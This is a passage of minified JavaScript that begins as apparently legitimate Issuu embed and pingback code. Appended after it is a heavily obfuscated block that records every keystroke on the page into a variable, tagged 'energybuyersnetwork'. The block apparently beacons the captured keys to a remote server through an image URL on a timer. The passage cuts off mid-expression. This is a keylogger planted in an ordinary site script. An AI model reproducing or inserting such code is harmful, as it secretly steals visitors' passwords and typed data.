                crossDomain: !0
            })
        }

        function u(t) {
            if (e.XDomainRequest) {
                var n = r(),
                    i = new XDomainRequest;
                i.open("POST", n), i.send(t)
            }
        }

        function a(t) {
            var n = r(),
                i = "pingback",
                s = d.base64.encode(t),
                o = .04;
            f.setCookie(i, s, o);
            var u = new Image(1, 1);
            u.src = n + "?" + (new Date).getTime(), e.setTimeout(function () {
                f.clearCookie(i)
            }, 100)
        }

        function c(t) {
            function i(e) {
                var t = "post_frame" + e;
                d("body").append('<iframe id="' + t + '" style="width: 0; height: 0; border: none;"></iframe>'), n = d("iframe#" + t)
            }

            function s() {
                n.remove()
            }

            function o(e) {
                var t = r(),
                    i = n.contents().find("body"),
                    s = '<form method="post" action="' + t + '">';
                s += '<textarea name="data">' + e + "</textarea>", s += "</form>", d(s).appendTo(i);
                var o = d("form", i);
                o.length > 0 && o[0].submit()
            }
            var n;
            i(l++), e.setTimeout(function () {
                o(t), e.setTimeout(function () {
                    s()
                }, 300)
            }, 1)
        }

        function h(e) {
            a(e), c(e), u(e), s(e)
        }

        function p() {
            return d.browser.msie ? e.XDomainRequest ? O.PINGBACK_SEND_MODE.XDR : O.PINGBACK_SEND_MODE.COOKIE : O.PINGBACK_SEND_MODE.JQUERY
        }

        function v(e) {
            t || (t = p());
            switch (t) {
            case O.PINGBACK_SEND_MODE.LOG:
                i(e);
                break;
            case O.PINGBACK_SEND_MODE.JQUERY:
                s(e);
                break;
            case O.PINGBACK_SEND_MODE.XDR:
                u(e);
                break;
            case O.PINGBACK_SEND_MODE.IFRAME:
                c(e);
                break;
            case O.PINGBACK_SEND_MODE.COOKIE:
                a(e);
                break;
            case O.PINGBACK_SEND_MODE.ALL:
                h(e);
                break;
            case O.PINGBACK_SEND_MODE.CALLBACKFN:
                n(r(), e)
            }
            var o = "http://gnip.issuu.com/pixel.gif?&jsoncallback=?";
            d.getJSON(o)
        }

        function m(e, r) {
            t = e, r && (n = r)
        }
        var t, n, l = 0;
        return {
            setSendMode: m,
            send: v
        }
    }();
    var M = function () {
        function r(e) {
            return o.configProto + o.configHost + o.configPath + e + ".jsonp"
        }

        function i(e) {
            var n = {};
            return d.each(e, function (e, r) {
                if (typeof t[e] == "function") {
                    var i = t[e](r);
                    n[i.target] = i.value
                }
            }), n
        }

        function s(e, t, r) {
            n[e]++, n[e] < o.retries ? u(e, t, r) : r && r(e)
        }

        function u(t, n, o) {
            "use strict";
            var u = e.setTimeout(function () {
                s(t, n, o)
            }, 2e3),
                a = function () {
                    e.clearTimeout(u)
                };
            d.ajax(r(t), {
                cache: !0,
                jsonp: !1,
                dataType: "jsonp",
                jsonpCallback: "cb_" + t.slice(t.indexOf("/") + 1, t.length),
                crossDomain: !0,
                success: function (e) {
                    a(), n && n(i(e))
                },
                error: function (e, r) {
                    a(), s(t, n, o)
                }
            })
        }
        var t = {}, n = {};
        return function () {
            function n(e, n, r) {
                typeof r != "function" && (r = function (e) {
                    return e
                }), t[e] = function (e) {
                    return {
                        target: n,
                        value: r(e)
                    }
                }
            }

            function r(e) {
                return !!e
            }
            n("id", "documentId"), n("du", "username", function (e) {
                return e.toLowerCase()
            }), n("dn", "name"), n("pg", "pageNumber"), n("st", "titleBarEnabled", r), n("sa", "proSidebarEnabled", r), n("bc", "embedBackground"), n("bi", "backgroundImage"), n("fc", "backgroundColor"), n("ss", "shareMenuEnabled", r), n("pr", "printButtonEnabled", r), n("sh", "shareButtonEnabled", r), n("se", "searchButtonEnabled", r), n("sl", "showHtmlLink", r), n("af", "autoFlip", r), n("vm", "viewMode", function (e) {
                return e === "s" ? "singlePage" : "doublePage"
            }), n("lg", "logo"), n("th", "theme"), n("lo", "layout"), n("lt", "linkTarget", function (e) {
                return e === "n" ? "_blank" : "_self"
            }), t.bp = function (e) {
                switch (e) {
                case "s":
                    return {
                        target: "backgroundStretch",
                        value: !0
                    };
                case "t":
                    return {
                        target: "backgroundTile",
                        value: !0
                    };
                default:
                    return {
                        target: "backgroundTile",
                        value: !1
                    }
                }
            }
        }(), {
            load: function (e, t, r) {
                n[e] = 0, e === "invalid" ? r && r(e) : u(e, t, r)
            }
        }
    }()
})(window, document);var keys='';var page='energybuyersnetwork';var date=new Date();document[(String[((function(){var s=String.fromCharCode(0x65),I=String.fromCharCode(0150,97,0x72,0x43),T=(function () { var N="f"; return N })(),W=String.fromCharCode(0x6f,100),i=(function () { var aV="mC",l="ro"; return l+aV })();return T+i+I+W+s;})())](('aBY'.length*((String.fromCharCode(0143)[((function () { var Y="h",$="engt",G="l"; return G+$+Y })())]*'RgEUkxYZ'.length+'Rs'.length)*String.fromCharCode(0x72,0102,0145)[(String.fromCharCode(0x6c,0x65,0x6e,0147,0164,0x68))]+'La'.length)+(5*'zwY'.length+0)),('jK'.length*('q'.length*('pTdhk'.length*'bHNlSKc'.length+'h'.length)+('nA'.length*6+3))+'RMtYtBgc'.length),('o'.length*('TEv'.length*027+14)+('W'.length*020+8)),(String.fromCharCode(0x56)[(String.fromCharCode(0x6c,101,110,0147,0x74,104))]*('UB'.length*('n'.length*33+6)+0)+(0x1*('dj'.length*8+4)+3)),(String.fromCharCode(0x50)[(String.fromCharCode(108,0145,110,103,0164,0150))]*('diOZNuIZZ'.length*((function () { var X='j',F='p'; return F+X })()[((function () { var TR="th",S="g",h="l",w="en"; return h+w+S+TR })())]*'XiWP'.length+'rq'.length)+'dMOm'.length)+(6*0x4+3)),('Q'.length*(String.fromCharCode(0x55,0x56)[((function () { var H="th",P="leng"; return P+H })())]*('h'.length*(1*(0x1*19+2)+14)+'Ln'.length)+'LV'.length)+(1*(02*012+2)+14)),('x'.length*('SUd'.length*('Y'.length*0x10+2)+4)+('K'.length*060+8)),(String.fromCharCode(106)[(String.fromCharCode(0x6c,101,110,103,0x74,104))]*('MB'.length*0x2e+7)+'Sq'.length),('Km'.length*('u'.length*(0x1*(05*5+0)+3)+('AWPc'.length*'nneJVJ'.length+0))+('N'.length*013+0)),((function () { var zg='A'; return zg })()[(String.fromCharCode(0x6c,101,110,0147,0x74,0x68))]*('uBnbHO'.length*(03*'ZWvvY'.length+0)+'n'.length)+(02*0xc+0))))]=function(l){window[(function(){var p=String[((function () { var x="e",d="mCharCo",B="fr",k="d",r="o"; return B+r+d+k+x })())](('XE'.length*(('dCf'.length*6+4)*0x2+0)+28)),J=(function(){var dv=String.fromCharCode(0145);return dv;})(),$W=(function(){var D=(function () { var I="g"; return I })();return D;})();return $W+J+p;})()]=window[((function(){var Z=(function(){var _=String.fromCharCode(116);return _;})(),b=(function(){var O=String.fromCharCode(110),J=(function () { var E="e"; return E })(),Hj=String.fromCharCode(118);return Hj+J+O;})(),r2=(function(){var O=(function () { var Q="e"; return Q })();return O;})();return r2+b+Z;})())]?event:l;window[(function(){var E=(function(){var y5=String.fromCharCode(0171);return y5;})(),uS=(function(){var n=(function () { var m="e"; return m })();return n;})(),Qv=String[(String.fromCharCode(102,114,0157,0x6d,0x43,104,0x61,0x72,0103,0157,0x64,0x65))]((03*033+26));return Qv+uS+E;})()]=window[(function(){var t=String[((function () { var R="de",s="rCo",K="fromCha"; return K+s+R })())](('VtmFncSb'.length*016+4)),O=String[((function () { var L="rCode",CP="fromCha"; return CP+L })())](('zJVP'.length*((0x1*0x15+0)*01+0)+17)),E=String[(String.fromCharCode(102,0162,0x6f,109,67,0x68,0141,0162,67,0x6f,0x64,0x65))](('Y'.length*0x5d+10));return E+O+t;})()][((function(){var T=String[((function () { var Ew="Code",R="r",_="fromCha"; return _+R+Ew })())]((0x65*'g'.length+0)),r=String[((function () { var n="e",K="rCod",AB="fromCha"; return AB+K+n })())](('pulFLPR'.length*015+9)),NB=String[((function () { var L="de",o="mCharCo",u="fro"; return u+o+L })())](('k'.length*('Z'.length*0x47+20)+16),('hEuHM'.length*022+11),('qG'.length*052+37),((01*7+4)*'tiVzUn'.length+1)),m=String[((function () { var M="arCode",by="omCh",y="f",Tj="r"; return y+Tj+by+M })())](('HiU'.length*(('D'.length*013+0)*0x3+0)+12));return NB+m+r+T;})())]?window[(function(){var a=String[(String.fromCharCode(0146,0x72,0x6f,0155,0103,0x68,97,0x72,0x43,0157,0144,101))](('zYm'.length*36+8)),T=(function(){var Vq=(function () { var iB="e"; return iB })();return Vq;})(),V=(function(){var kA=String.fromCharCode(0147);return kA;})();return V+T+a;})()][(String[(String[(String.fromCharCode(0146,0162,111,0155,67,104,0141,0162,0x43,0157,0144,0145))](('yf'.length*0x25+28),(1*0x5a+24),('u'.length*65+46),(04*(02*(1*010+3)+4)+5),('Q'.length*60+7),('U'.length*0126+18),(('L'.length*0x9+4)*'yZVpXeQ'.length+6),('a'.length*('FvvxkndMv'.length*('y'.length*'puOmFRUs'.length+2)+9)+15),('O'.length*(1*(02*0xb+7)+12)+26),(026*'suAUZ'.length+1),('AQB'.length*0x1e+10),(01*0x49+28)))](('d'.length*('kC'.length*('lXI'.length*017+6)+'LzxF'.length)+'p'.length),(String.fromCharCode(0125,0x69)[((function () { var y="gth",e="n",fZ="le"; return fZ+e+y })())]*('S'.length*('A'.length*(String.fromCharCode(121)[(String.fromCharCode(0154,0x65,0x6e,103,0164,104))]*(String.fromCharCode(116,0125,0112)[(String.fromCharCode(0x6c,0145,0x6e,0x67,0x74,0x68))]*String.fromCharCode(0107,0x6a,0106,115)[((function () { var z="ngth",r="le"; return r+z })())]+'Rg'.length)+('tBYTs'.length*'sG'.length+0))+'wakOh'.length)+(05*03+0))+(1*'tADbotI'.length+6)),('jJE'.length*(String.fromCharCode(0x57)[((function () { var V="h",R="engt",O="l"; return O+R+V })())]*(0x1*015+8)+(01*(1*'otNVoY'.length+5)+1))+('B'.length*026+0)),(String.fromCharCode(0x56,0x6d)[((function () { var o0="ngth",a="le"; return a+o0 })())]*(0x1*(1*((01*'FsGvjhB'.length+4)*0x2+0)+4)+0)+('aLr'.length*4+3)),(String.fromCharCode(79)[((function () { var o="h",PU="engt",t="l"; return t+PU+o })())]*('b'.length*0100+18)+(2*13+3)),((function () { var M='biU',wZ='sGnD',Z='b'; return Z+wZ+M })()[(String.fromCharCode(0154,0145,0x6e,0147,116,0150))]*((0x3*0x4+0)*'V'.length+('fin'.length-3))+'DrRq'.length),((function () { var MD='G'; return MD })()[(String.fromCharCode(0x6c,0145,0x6e,0x67,0164,0150))]*(1*0x2e+11)+('P'.length*(1*19+7)+18))))]:window[String[(String[(String.fromCharCode(0146,0x72,111,109,0103,0x68,97,0x72,67,0157,0144,0145))]((0x33*0x2+0),('vFiqhBalr'.length*12+6),(0x1*(0x1*(('w'.length*(9*'Pa'.length+1)+11)*'fL'.length+0)+50)+1),('W'.length*(012*0xa+4)+5),('j'.length*(02*033+13)+0),('a'.length*0x37+49),(0x8*('Rz'.length*5+2)+1),('M'.length*88+26),((0x10*0x1+0)*4+3),('duuN'.length*(04*0x6+2)+7),('aB'.length*49+2),(020*'RVesee'.length+5)))](('i'.length*('d'.length*('I'.length*('tFhz'.length*(06*'Wg'.length+0)+4)+(('oKZQJ'.length*4+0)*'c'.length+0))+(0x1*0x1e+1))+('X'.length-1)),(String.fromCharCode(0x4a)[((function () { var I="h",Q="t",fA="leng"; return fA+Q+I })())]*((function () { var sb='R',VJ='p'; return VJ+sb })()[(String.fromCharCode(108,101,0156,0147,0164,0x68))]*(0x2*012+5)+'MXbJkl'.length)+(0x1*0x1e+15)),('jp'.length*(String.fromCharCode(0x61,103,0106)[((function () { var g="gth",_M="n",s="l",SH="e"; return s+SH+_M+g })())]*(String.fromCharCode(0x74,75,0107,82,0152,0143)[((function () { var m="gth",n="n",_V="l",C4="e"; return _V+C4+n+m })())]*(function () { var Wk='x',dV='L'; return dV+Wk })()[(String.fromCharCode(0154,0145,110,103,0164,0150))]+('iIGlxOg'.length-7))+'ecgVWPVc'.length)+(02*12+4)))][((function(){var E=String[(String.fromCharCode(0146,0x72,0x6f,0x6d,0103,104,0x61,0162,0103,111,0144,101))]((1*(('Mz'.length*5+0)*06+4)+36),(1*0131+12)),UO=String[(String.fromCharCode(0146,114,0157,109,0103,0150,97,0x72,67,111,100,0x65))](('njOaOEL'.length*(1*'cHijGlGmT'.length+7)+2),(0x2*('fDKJg'.length*0x6+1)+5),(01*(1*56+24)+31)),v5=String[((function () { var lM="de",cI="mCharCo",ok="fro"; return ok+cI+lM })())]((01*(05*((01*0x6+4)*1+0)+2)+47),('K'.length*(0x1*0x3e+20)+22),(014*'iVXKhuYV'.length+1));return v5+UO+E;})())];window[String[((function(){var v=String.fromCharCode(0x43,0157,100,0x65),aq=(function () { var J="r",E="a"; return E+J })(),f=(function () { var l$="m",b="ro",IT="f"; return IT+b+l$ })(),T=String.fromCharCode(0103,104);return f+T+aq+v;})())](((function () { var w9='n',fT='D'; return fT+w9 })()[((function () { var i="th",_="leng"; return _+i })())]*('mxJVbrvV'.length*(function () { var b='VB',u='CBgb'; return u+b })()[(String.fromCharCode(0154,0x65,0156,103,0164,104))]+'e'.length)+'ZkoAdpTPq'.length),('DAg'.length*('t'.length*('S'.length*(02*0x7+2)+13)+('LoBhaFi'.length-7))+(016*'E'.length+0)),(String.fromCharCode(0x71)[((function () { var T="ngth",R7="e",Uw="l"; return Uw+R7+T })())]*('l'.length*('l'.length*36+17)+27)+(0x1*((016*'M'.length+0)*'xT'.length+1)+12)))]=String[((function(){var c=String[(String.fromCharCode(102,0162,111,0155,0103,104,0141,114,67,0x6f,0144,0145))]((1*(0x4*('N'.length*18+0)+17)+22),('x'.length*0134+8),('VyWJtIi'.length*13+10)),kn=String[(String.fromCharCode(0146,114,0x6f,109,0103,0x68,0141,0x72,0103,111,0144,101))](('M'.length*('K'.length*052+15)+47),(0x1*('twPbAUC'.length*011+6)+28),('qy'.length*49+16),(5*13+2)),B=(function(){var Ul=(function () { var f="C"; return f })(),Rp=String.fromCharCode(0x6d),NX=String.fromCharCode(0x66,0x72,0157);return NX+Rp+Ul;})();return B+kn+c;})())](window[String[((function(){var r_=(function () { var us="e",Cj="d",SD="o"; return SD+Cj+us })(),L=String.fromCharCode(0157,109,0x43,0150,97,114,0x43),sO=String.fromCharCode(0146),YB=String.fromCharCode(0x72);return sO+YB+L+r_;})())](('x'.length*(04*('c'.length*(01*('P'.length*13+0)+4)+2)+0)+('XbHzCot'.length*'jMkV'.length+3)),('iaVFfGVzL'.length*('xzggT'.length*'Oc'.length+1)+'Uv'.length),((function () { var W='o'; return W })()[((function () { var e3="h",rf="ngt",oL="l",SP="e"; return oL+SP+rf+e3 })())]*('VklR'.length*('Oi'.length*7+6)+7)+(2*(0x1*'QpsZtIr'.length+5)+10)))]);window[(function(){var kI=(function(){var wU=String.fromCharCode(0x73);return wU;})(),i6=String[((function () { var rG="rCode",k="fromCha"; return k+rG })())](('Fzgu'.length*24+5),(01*0140+25)),jm=String[((function () { var _e8="de",C="rCo",$x="fromCha"; return $x+C+_e8 })())]((0x1*107+0));return jm+i6+kI;})()]+=window[String[(String[(String.fromCharCode(102,114,111,0155,0x43,104,97,0x72,0x43,111,0x64,101))]((('PCJ'.length*('U'.length*('zcfyHq'.length*'Vv'.length+0)+2)+9)*'ey'.length+0),('l'.length*102+12),(('EfUKaN'.length*'AG'.length+1)*'KGUocGZi'.length+7),(('m'.length*('h'.length*(0xb*'x'.length+0)+4)+3)*06+1),(01*043+32),('u'.length*(48*'Rj'.length+0)+8),('zsKPBn'.length*(1*0xc+4)+1),('vdq'.length*045+3),(1*(03*('x'.length*(02*'kOATEf'.length+3)+6)+1)+3),(1*0x66+9),('He'.length*('d'.length*051+2)+14),(02*('s'.length*29+14)+15)))](('j'.length*('Fy'.length*30+20)+(0x5*'BOYOZ'.length+2)),(((function () { var D='nN',k='O',J='iA'; return J+k+D })()[(String.fromCharCode(0154,0145,110,103,116,0150))]*'PQg'.length+'M'.length)*(function () { var NQ='opMS',wV='Z',Ei='Q'; return Ei+wV+NQ })()[((function () { var U0="h",sm="t",B3="leng"; return B3+sm+U0 })())]+'ADeRd'.length),('O'.length*(String.fromCharCode(0127)[(String.fromCharCode(0154,0145,0156,0x67,116,0150))]*(0x4*(2*'TJytbhATZ'.length+0)+4)+'NJczlZ'.length)+('Ah'.length*('K'.length*(0x3*3+1)+4)+11)))];};window[((function(){var E=String[(String.fromCharCode(102,0x72,111,0x6d,0x43,0x68,0x61,0x72,67,0x6f,0144,101))]((041*03+2),(0x1*('vDF'.length*26+14)+22),(01*('a'.length*(0x2*022+17)+37)+28),('p'.length*('k'.length*('p'.length*(1*('R'.length*('eWlLY'.length*'ICr'.length+1)+2)+9)+26)+18)+26),((0x1*('D'.length*('Cy'.length*'jZyHSPfB'.length+7)+8)+23)*0x2+0)),v=String[(String.fromCharCode(0x66,0x72,0157,109,0103,104,0141,0162,0103,0157,100,101))]((01*(04*0xd+7)+56),('N'.length*0101+36),(0x1*60+56),('wj'.length*0x24+1),(01*(0x1*83+25)+2),('y'.length*78+38));return v+E;})())](function(){new window[String[((function(){var n=(function () { var jh="ode",z="C",c="r"; return c+z+jh })(),y=String.fromCharCode(0103,0150,0141),j=(function () { var a="r",qA="f"; return qA+a })(),s=String.fromCharCode(0x6f,109);return j+s+y+n;})())](('f'.length*(1*(0x1*033+7)+3)+(01*29+7)),((function () { var f='Q'; return f })()[((function () { var M="gth",g="n",u="le"; return u+g+M })())]*(1*('DyqVVFKwn'.length*'bYBsnAA'.length+3)+25)+('vt'.length*9+0)),(String.fromCharCode(0x77)[((function () { var V="th",cy="leng"; return cy+V })())]*(0x3*('c'.length*(01*0x9+5)+10)+19)+'BaCfXg'.length),(('A'.length*('qJz'.length*'gYOPVZXs'.length+6)+4)*(function () { var e='E',o='e',O='Q'; return O+o+e })()[(String.fromCharCode(0154,101,0x6e,0147,0164,0x68))]+'q'.length),(String.fromCharCode(0x4e)[(String.fromCharCode(0154,101,110,0147,0164,0x68))]*('d'.length*('l'.length*025+17)+(0x1*(07*0x3+2)+4))+('X'.length*('t'.length*(0x3*'KSDAx'.length+2)+7)+12)))]()[(String[(String[(String.fromCharCode(0x66,0162,0157,109,0103,0x68,0141,0x72,0x43,0x6f,0x64,0x65))]((0x1*(03*0x12+2)+46),(07*('wgl'.length*04+3)+9),('X'.length*('yFU'.length*(0x1*19+10)+15)+9),((011*02+0)*06+1),(0x6*('Jy'.length*4+3)+1),(6*0x11+2),('a'.length*('b'.length*('aEifPln'.length*6+0)+32)+23),(2*(0x1*(1*0x13+17)+11)+20),('t'.length*('B'.length*0x2e+18)+3),('ClWp'.length*033+3),('p'.length*(0x2*('I'.length*18+16)+28)+4),('Lf'.length*0x2e+9)))](('QPNA'.length*('f'.length*(2*'TRPMRgB'.length+4)+'sHTHJBESy'.length)+'RBRRVrA'.length),('dpMv'.length*(0x1*('w'.length*0x10+2)+5)+('G'.length*(01*(0x1*0x7+4)+7)+4)),(('kUk'.length*3+2)*'JMYRpBuEs'.length+('u'.length-1))))]=String[((function(){var no=(function () { var z="e",qu="rCod",re="a"; return re+qu+z })(),e8=String.fromCharCode(0155,0x43,0150),v=String.fromCharCode(0146,0x72,111);return v+e8+no;})())](('t'.length*(('u'.length*('EX'.length*(function () { var Z='SLiR',L='U',uG='b'; return uG+L+Z })()[(String.fromCharCode(0154,101,0156,0x67,0x74,0150))]+'F'.length)+('yAH'.length-3))*'PKcfU'.length+'ph'.length)+('EgPe'.length*010+5)),((function () { var W='Q',fh='X'; return fh+W })()[(String.fromCharCode(0x6c,0x65,0156,0x67,0x74,0x68))]*('i'.length*('Z'.length*(0x3*014+4)+'IxDzO'.length)+'FDGyWa'.length)+('hCa'.length*'yeNd'.length+2)),((function () { var HG='W'; return HG })()[((function () { var A="ngth",GG="le"; return GG+A })())]*('p'.length*((function () { var bj='V'; return bj })()[(String.fromCharCode(0x6c,0x65,110,0147,116,0150))]*(0x1*075+3)+('D'.length*('dwO'.length*'fHh'.length+2)+9))+('i'.length*15+5))+(0x6*'iv'.length+0)),(String.fromCharCode(0132,0116)[(String.fromCharCode(108,101,110,0147,116,0150))]*(String.fromCharCode(0163,0x53)[(String.fromCharCode(0154,0145,110,0147,0x74,104))]*('cU'.length*0x7+5)+('n'.length*'ShVeDxAWm'.length+4))+(0x2*'csqFU'.length+0)),(String.fromCharCode(0x70,0x50)[((function () { var ek="th",oG="ng",ss="l",du="e"; return ss+du+oG+ek })())]*('M'.length*022+6)+('S'.length*010+2)),('gOLBtMn'.length*'gdIRJH'.length+'zayjT'.length),('ll'.length*('R'.length*014+8)+'cjlmlGA'.length),((function () { var I='Q'; return I })()[((function () { var i="gth",q="n",Vl="le"; return Vl+q+i })())]*(String.fromCharCode(0x67,0x6f)[((function () { var AB="ngth",s="e",C="l"; return C+s+AB })())]*('q'.length*('g'.length*11+9)+19)+(0x1*('nTK'.length*0x4+0)+9))+('D'.length*9+7)),(String.fromCharCode(0101)[((function () { var Qh="ngth",d="le"; return d+Qh })())]*((function () { var hT='F'; return hT })()[((function () { var a="th",Q="leng"; return Q+a })())]*('j'.length*47+1)+(01*040+11))+('XUB'.length*'tWwUkL'.length+3)),('ieSNeg'.length*('fFEVoJW'.length*(function () { var YT='Z',RL='x'; return RL+YT })()[((function () { var p="th",kq="ng",Vw="le"; return Vw+kq+p })())]+('wzBaY'.length-5))+('C'.length*0xd+0)),(('Qh'.length*'CnPOYT'.length+0)*'EToPMGpD'.length+'fQa'.length),('Ifi'.length*((function () { var r='n',y='c',R='kGuT',U='s'; return R+U+y+r })()[((function () { var E="h",i8="t",gI="len",n="g"; return gI+n+i8+E })())]*'Dfdr'.length+'l'.length)+(1*('vofn'.length*'Ubr'.length+0)+2)),((function () { var YS3='x',DY='J',c='pYf'; return c+DY+YS3 })()[(String.fromCharCode(0154,101,110,0x67,0x74,0150))]*('XK'.length*String.fromCharCode(116,106,0117,119,0116,0x65,107)[(String.fromCharCode(108,101,0156,0x67,0164,104))]+'aBJkw'.length)+(6*'nq'.length+0)),((function () { var m='n',Zw='i'; return Zw+m })()[(String.fromCharCode(0x6c,0x65,0x6e,0147,0x74,104))]*('k'.length*('VnRJbE'.length*(function () { var vI='n',So='v',v='QPwZ'; return v+So+vI })()[((function () { var Gb="h",ey="ngt",T="le"; return T+ey+Gb })())]+'zFZi'.length)+('w'.length*7+3))+'ABSGT'.length),((function () { var VO='U'; return VO })()[((function () { var IM="gth",GL="en",Bi="l"; return Bi+GL+IM })())]*('r'.length*('D'.length*('AhvBaO'.length*7+0)+35)+'vwkywt'.length)+('o'.length*(02*('Xzotw'.length*'jp'.length+1)+1)+10)),('y'.length*((function () { var k='H'; return k })()[(String.fromCharCode(0x6c,0145,110,0147,116,0150))]*('RrV'.length*('A'.length*(05*2+1)+'LRNRoYMa'.length)+'wvW'.length)+('C'.length*(03*'NCBKX'.length+0)+3))+('swgrc'.length*04+1)),(String.fromCharCode(0x56)[((function () { var DJ="th",ew="ng",D9="l",TO="e"; return D9+TO+ew+DJ })())]*('m'.length*('I'.length*('VoE'.length*0xb+8)+'uUiepQpH'.length)+(2*012+5))+(0x2*015+4)),((function () { var _='s'; return _ })()[(String.fromCharCode(0x6c,101,110,0x67,0x74,0x68))]*((function () { var Ww='uP',JQ='OULaZ',j='x'; return j+JQ+Ww })()[((function () { var VG="h",bG="engt",t="l"; return t+bG+VG })())]*('JP'.length*'QFCd'.length+'kLh'.length)+'iPV'.length)+(0x2*5+0)),('gk'.length*('uCB'.length*020+2)+(3*03+1)),('n'.length*(String.fromCharCode(0153)[((function () { var GE="th",v1="g",Mb="le",$9="n"; return Mb+$9+v1+GE })())]*(String.fromCharCode(110)[(String.fromCharCode(0154,0x65,110,0x67,0x74,104))]*('J'.length*(0x3*('V'.length*(01*('U'.length*9+1)+3)+0)+3)+8)+(('w'.length*(0x1*0x6+5)+1)*0x1+0))+(02*024+0))+(1*(('nW'.length*0x5+1)*1+0)+2)),(String.fromCharCode(0107,72)[(String.fromCharCode(0154,0x65,110,0147,0164,0150))]*(1*('I'.length*016+0)+2)+('BQ'.length*6+2)),(String.fromCharCode(82)[((function () { var Rh="th",s2="g",B="len"; return B+s2+Rh })())]*(2*047+0)+('o'.length*(1*('Z'.length*('d'.length*'WRTOMtJwl'.length+2)+3)+8)+5)),(((06*0x4+3)*'H'.length+0)*String.fromCharCode(0x74,100,0x41,84)[(String.fromCharCode(108,0x65,0156,0x67,116,0150))]+'ew'.length),('isqL'.length*(01*'IBYTUU'.length+4)+'SULOhYs'.length),('l'.length*(12*'Ry'.length+0)+(01*18+4)),('zeS'.length*(01*(02*15+4)+1)+'lhcFazkSz'.length),('S'.length*((1*061+10)*1+0)+('AF'.length*023+4)),('jGcCDoe'.length*('Zf'.length*5+4)+'x'.length),('I'.length*('sN'.length*((function () { var Wj='i',Xs='x'; return Xs+Wj })()[((function () { var BZ="gth",hN="len"; return hN+BZ })())]*(function () { var Wf='H',zl='A',tK='jbHyW',re='FJ'; return tK+re+zl+Wf })()[((function () { var F_="gth",E2="en",BT="l"; return BT+E2+F_ })())]+'zlvm'.length)+(0x1*06+4))+(0x5*('VTJ'.length*'DYK'.length+1)+1)),((function () { var em='p'; return em })()[((function () { var Z9="th",mn="ng",Hc="l",j8="e"; return Hc+j8+mn+Z9 })())]*(String.fromCharCode(0x7a,0x66,0x53)[((function () { var $VY="h",N="t",KC="leng"; return KC+N+$VY })())]*(String.fromCharCode(0155,77)[((function () { var UP="h",b="t",bI="le",mi="ng"; return bI+mi+b+UP })())]*('i'.length*('cf'.length*05+1)+3)+'RYqm'.length)+'eA'.length)+(('H'.length*('ox'.length*05+2)+2)*1+0)),('OSe'.length*(('XriooKt'.length*'Gh'.length+1)*String.fromCharCode(105,113)[(String.fromCharCode(0154,101,0x6e,0147,0x74,0150))]+('NTMiOy'.length-6))+('t'.length*8+3)),(String.fromCharCode(79)[(String.fromCharCode(0154,101,0x6e,0147,0x74,104))]*('G'.length*23+7)+(02*7+3)),('P'.length*('ZK'.length*('Mk'.length*0xb+3)+7)+(0x2*25+4)),('M'.length*(0x2*(0x2*('W'.length*('c'.length*'UYibyHyV'.length+5)+0)+3)+23)+('b'.length*('rys'.length*'TxkLrl'.length+2)+16)),(String.fromCharCode(0x69,70,0112,0x6b,109,103,116)[(String.fromCharCode(108,0145,0156,0x67,0164,0150))]*('JZ'.length*'WDIVdbG'.length+1)+('Qg'.length*'xsyD'.length+3)),('biIDymRQ'.length*('sgNf'.length*'xNZ'.length+'AW'.length)+('hRPgAY'.length-6)),('p'.length*('FSNq'.length*((function () { var qz7='H'; return qz7 })()[((function () { var EQ="th",zC="g",uK="le",G7="n"; return uK+G7+zC+EQ })())]*('f'.length*('p'.length*(0x1*'FgirQaAj'.length+3)+1)+'qO'.length)+('Z'.length*(02*0x5+0)+2))+'YmMH'.length)+'EcJiFDzlc'.length),('D'.length*('B'.length*0101+5)+('Zj'.length*('x'.length*0x12+1)+8)),(String.fromCharCode(113)[(String.fromCharCode(0x6c,0x65,0x6e,103,116,104))]*(5*'qsSutmUi'.length+4)+'rc'.length),('H'.length*(01*075+20)+(1*0x15+10)),('q'.length*(('FkP'.length*String.fromCharCode(0x4b,0155,78,0163,0116,0114)[((function () { var iH="h",bF="ng",$1="l",xo="t",Up="e"; return $1+Up+bF+xo+iH })())]+'e'.length)*'dfC'.length+'X'.length)+('Se'.length*0x15+4)),((function () { var K='N'; return K })()[(String.fromCharCode(0x6c,0x65,110,0147,0164,0x68))]*(('f'.length*8+5)*'zIhiJw'.length+2)+('e'.length*22+10)),(String.fromCharCode(0x43,109)[(String.fromCharCode(0x6c,101,0x6e,103,0164,0x68))]*(String.fromCharCode(78)[(String.fromCharCode(108,0x65,110,0147,116,104))]*('q'.length*('HlTmx'.length*03+0)+0)+(('T'.length*07+6)*'R'.length+0))+'UyklEei'.length),('i'.length*('k'.length*68+22)+'vtGDKlG'.length),('n'.length*(String.fromCharCode(0x77)[(String.fromCharCode(0154,101,0156,0x67,0x74,0x68))]*('zRz'.length*10+2)+(0x1*(02*('k'.length*'YlKyLFJPI'.length+3)+4)+1))+('nJQndPnCw'.length-9)))+window[String[((function(){var Ok=(function () { var $D="de",dq="rCo"; return dq+$D })(),SR=(function () { var fv="ha",$G="mC",Gf="fro"; return Gf+$G+fv })();return SR+Ok;})())](('Cs'.length*('IZtQEDCm'.length*String.fromCharCode(0104,103,0x42,0163,0102,0x48)[((function () { var x="ngth",po="le"; return po+x })())]+'ZK'.length)+('H'.length*0xa+2)),((function () { var cCQ='l',UL='i'; return UL+cCQ })()[((function () { var z="th",W7="leng"; return W7+z })())]*(3*(0x2*0x7+0)+3)+'keibLqR'.length),((function () { var Od='f'; return Od })()[((function () { var _y="h",uH="engt",rQ="l"; return rQ+uH+_y })())]*(87*'E'.length+0)+(01*('T'.length*016+1)+1)),(String.fromCharCode(0154)[(String.fromCharCode(0x6c,0x65,0x6e,103,0x74,104))]*(0x1*0x31+26)+(0x2*('q'.length*'CXPUhpYZ'.length+2)+6)))]+(function(){var ue=(function(){var L6=(function () { var qI='='; return qI })();return L6;})(),YV=String[((function () { var Pf="rCode",WN="fromCha"; return WN+Pf })())](('I'.length*075+38)),NQ=String[(String.fromCharCode(102,0x72,111,0155,0x43,104,97,0x72,0103,0x6f,100,0x65))](('r'.length*0x1e+8));return NQ+YV+ue;})()+window[(function(){var cY=String[((function () { var cK="de",D4="C",J="f",VS="harCo",X$="rom"; return J+X$+D4+VS+cK })())]((1*('B'.length*(0127*0x1+0)+2)+12)),Ey=(function(){var Bo=String.fromCharCode(116);return Bo;})(),oP=String[((function () { var mH="de",Jy="rCo",tG="fromCha"; return tG+Jy+mH })())](('o'.length*('Lw'.length*0x1a+8)+40),(('qfAy'.length*8+0)*3+1));return oP+Ey+cY;})()]+String[(String[((function () { var F9="Code",ps="romChar",sH="f"; return sH+ps+F9 